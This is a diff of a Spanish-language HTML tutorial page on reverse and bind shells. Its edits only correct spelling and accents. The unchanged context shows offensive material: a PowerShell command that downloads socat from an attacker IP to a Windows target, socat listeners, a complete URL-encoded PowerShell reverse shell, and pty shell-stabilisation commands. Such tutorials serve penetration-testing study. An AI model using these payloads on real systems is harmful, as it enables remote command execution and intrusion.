@@ -123,7 +123,7 @@
                     </li>
                 </ol>
                 <ol>
-                    <li><span class="comando5">Opcion 2</span></li>
+                    <li><span class="comando5">Opción 2</span></li>
                     <li><span class="comando2">Creamos el listener en la maquina atacante</span>
             
                         <pre><code class="language-bash line-numbers"data-start="1"
@@ -162,7 +162,7 @@
                 </ol>
 
                 <ol>
-                    <li><span class="comando5">Opcion 2</span></li>
+                    <li><span class="comando5">Opción 2</span></li>
 
                     <li><span class="comando2">Crearemos una bind shell en el target</span>
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
@@ -249,7 +249,7 @@
                     <li><span class="comando5">Cuando socat no viene instalado</span></li>
 
                     <li> <span class="comando2">Por defecto Socat no viene instalado, pero podemos cargar un
-                            precompilado
+                            pre-compilado
                             socat binary</span>
                  <span class="comando4"></span>
                         <a class="enlace"
@@ -278,12 +278,12 @@
                             >Invoke-WebRequest -uri http://&lbrack;TURN0&rbrack;socat.exe -outfile C:\\Windows\temp\socat.exe</code></pre>
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"> Invoke-WebRequest -uri http://10.10.10.123:80/socat -outfile C:\\Windows\temp\socat.exe</code></pre>
                     </li>
-                    <li><span class="comando2">Comprobamos que se subio el archivo</span></li>
+                    <li><span class="comando2">Comprobamos que se subió el archivo</span></li>
                     <li><span class="comando2">Ahora ponemos un listener con socat</span>
             
                         <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >socat TCP-L:&lbrack;PORT&rbrack; -</code></pre>
-                    <li><span class="comando2">Ahora nos vamo a windows y ejecuatamos el comando en powershell</span>
+                    <li><span class="comando2">Ahora nos vamos a windows y ejecutamos el comando en powershell</span>
             
 
                         <pre><code class="language-powershell line-numbers" style="white-space:pre-wrap;" data-start="1"
@@ -322,7 +322,7 @@
                     </li>
                     <li><span class="comando2">Si en caso que el php se ejecuta en un Windows Server, necesitamos correr
                             un reverse shell en powershell </span></li>
-                    <li><span class="comando2">Modificaresmos el IP y el PORT de la URL Encoded Power </span>
+                    <li><span class="comando2">Modificaremos el IP y el PORT de la URL Encoded Power </span>
             
                         <pre><code class="language-html line-numbers" style="white-space:pre-wrap;">powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code></pre>
                     </li>
@@ -348,7 +348,7 @@
                         Este es un fragmento de código que se
                         ejecuta directamente en el servidos.
                         Se conecta de nuevo a un oyente en espera, pero en realidad
-                        no contine ningún código de Shell inverso por si mismo. En su lugar, se conecta al oyente y
+                        no contiene ningún código de Shell inverso por si mismo. En su lugar, se conecta al oyente y
                         usa
                         la conexión para cargar el payload real, ejecutándola directamente y evitando que toque el
                         disco
@@ -518,11 +518,11 @@
             <li><span class="comando1">rlwrap</span>
      pasos para generar una shell, nos da acceso al
                 historial, el
-                autocompletado de pestañas y teclas de flecha inmediatamente despues de recibir un shell, este tipo de
-                shell es mucho mas complejo y es tecnicamente particular cuando se trata de una Shell de Windows, que
-                son notoriamente dificiles de estabilizar.
+                auto completado de pestañas y teclas de flecha inmediatamente después de recibir un shell, este tipo de
+                shell es mucho mas complejo y es técnicamente particular cuando se trata de una Shell de Windows, que
+                son notoriamente difíciles de estabilizar.
                 <ol>
-                    <li><span class="comando5">Nota se debe seguir utilizando alguna estabilizacion manual si desea usar
+                    <li><span class="comando5">Nota se debe seguir utilizando alguna estabilización manual si desea usar
                             Ctrl +
                             C dentro del shell </span> </li>
                 </ol>
@@ -565,9 +565,9 @@
 
             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                             >python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
-            <span class="comando5">Nota: algunos objetivos neceistan especificar la version correcta
+            <span class="comando5">Nota: algunos objetivos necesitan especificar la version correcta
                 de Pyhon</span>
-            <span class="comando5">Reemplazar la version de Pyhon por: Pyhon, Python2 ó
+            <span class="comando5">Reemplazar la version de Python por: Python, Python2 ó
                 Python3</span>
 
             <br>
@@ -591,7 +591,7 @@
                 propio terminal no será visible (como resultado de haber desactivado el echo del
                 terminal).</span>
             <br>
-            <span class="comando5">Solucion, escribir</span>
+            <span class="comando5">Solución, escribir</span>
 
             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                     >reset</code></pre>
@@ -622,7 +622,7 @@
                                 >reset</code></pre>
 
 
-            <span class="comando2">5. Nos pedira el tipo de terminal </span>
+            <span class="comando2">5. Nos pedirá el tipo de terminal </span>
             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;" data-start="1"
                                 >Terminal type? Xterm</code></pre>
 
